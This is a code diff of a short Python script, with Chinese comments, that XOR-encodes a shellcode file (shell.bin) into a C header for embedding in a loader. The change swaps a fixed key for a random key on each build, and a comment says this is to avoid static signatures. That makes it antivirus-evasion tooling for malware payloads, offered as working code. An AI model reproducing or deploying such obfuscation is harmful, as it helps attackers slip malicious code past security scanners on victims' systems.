@@ -1,16 +1,21 @@
-# encrypt.py
-key = 0x5C
+#!/usr/bin/env python3
+"""
+把 shell.bin ⇒ enc_shellcode.h
+随机异或 key，每次生成都不同。
+"""
+import os, random, textwrap, pathlib
 
-with open("shell.bin", "rb") as f:
-    data = f.read()
+KEY = random.randint(1, 255)           # ❶ 随机 key，避免静态签名
+BIN = pathlib.Path("shell.bin").read_bytes()
 
-enc = bytes([b ^ key for b in data])
+enc = bytes(b ^ KEY for b in BIN)
 
-with open("enc_shellcode.h", "w") as f:
-    f.write("unsigned char shellcode[] = {\n")
+with open("enc_shellcode.h", "w", encoding="utf-8") as fh:
+    fh.write(f"#pragma once\n#define XOR_KEY 0x{KEY:02x}\n\n")
+    fh.write("unsigned char shellcode[] = {\n")
     for i, b in enumerate(enc):
-        f.write(f"0x{b:02x},")
+        fh.write(f"0x{b:02x},")
         if (i + 1) % 16 == 0:
-            f.write("\n")
-    f.write("\n};\n")
-    f.write(f"unsigned int shellcode_len = {len(enc)};\n")
+            fh.write("\n")
+    fh.write("\n};\n")
+    fh.write(f"unsigned int shellcode_len = {len(enc)};\n")
